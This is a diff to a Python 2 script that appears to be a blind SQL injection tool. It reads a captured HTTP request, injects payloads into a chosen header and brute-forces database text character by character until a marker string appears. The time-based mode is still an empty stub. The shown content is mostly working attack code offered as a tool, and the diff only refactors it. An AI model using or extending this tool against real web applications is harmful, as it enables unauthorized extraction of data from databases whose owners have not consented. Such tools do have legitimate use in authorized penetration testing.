@@ -20,29 +20,27 @@ injectionLength = 'POINT1'
 charset = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
            'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '@', '-', '_', ',', '!', '#', '$', '(', ')', ':']
-protocol = 'http://'
 proxies = {'http': 'http://127.0.0.1:8080'}
 sleepTime = 0.1
 autoRedirects = False
+protocol = 'http://'
+requestType = ''
 
 
 def sendRequest(headers):
     time.sleep(sleepTime)
     url = protocol + headers['Host'] + headers['URL']
-    requestType = headers['Type']
     tempHeaders = headers
+    del headers['URL']
     if (requestType == 'GET'):
         response = requests.get(url, headers=tempHeaders, proxies=proxies, allow_redirects=autoRedirects)
-        responseContent = response.content
-        responseHeaders = response.headers
-        return str(responseHeaders) + str(responseContent)
+        return str(response.headers) + str(response.content)
     if (requestType == 'POST'):
         DATA = headers['DATA']
         del headers['DATA']
         response = requests.post(url, data=DATA, headers=tempHeaders, proxies=proxies, allow_redirects=autoRedirects)
-        responseContent = response.content
-        responseHeaders = response.headers
-        return str(responseHeaders) + str(responseContent)
+        print response.headers
+        return str(response.headers) + str(response.content)
 
 
 def injectForText(headers, text):
@@ -66,8 +64,7 @@ def injectForText(headers, text):
         foundChar = False
         for i in charset:
             if (foundChar is False):
-                payload = urlpart1 + \
-                    str(substringCounter) + urlpart2 + str(i) + urlpart3
+                payload = urlpart1 + str(substringCounter) + urlpart2 + str(i) + urlpart3
                 headers[injectableHeader] = payload
                 response = sendRequest(headers)
                 print '{0}\r'.format(payload),
@@ -80,8 +77,8 @@ def injectForText(headers, text):
             print '\n' + 'FOUND: ' + foundString
 
 
-def injectForTime(headers):
-    print 'tralala'
+def injectForTime(headers, delay):
+    print 'lalala'
 
 
 def parseRequest(inputfile):
@@ -90,6 +87,7 @@ def parseRequest(inputfile):
     for line in file:
         brokenline = re.split('\s', line, 1)
         if (brokenline[0] == 'GET') or (brokenline[0] == 'POST'):
+            global requestType
             requestType = brokenline[0]
             requestURL = brokenline[1]
         else:
@@ -100,7 +98,6 @@ def parseRequest(inputfile):
                     headers[brokenline[0].split(':')[0]] = brokenline[1].split('\n')[0]
                 else:
                     headers['DATA'] = line
-    headers['Type'] = requestType
     headers['URL'] = requestURL.split(" ")[0]
     file.close()
     return headers
@@ -137,14 +134,18 @@ def main(argv):
     else:
         if (sqlitype == 'text') and (text == ''):
             usage()
-        else:
+        elif (sqlitype == 'text') and (text != ''):
             headers = parseRequest(inputfile)
             injectForText(headers, text)
+        else:
+            pass
         if (sqlitype == 'time') and (delay == ''):
             usage()
-        else:
+        elif (sqlitype == 'time') and (delay != ''):
             headers = parseRequest(inputfile)
             injectForTime(headers, delay)
+        else:
+            pass
 
 
 if __name__ == "__main__":
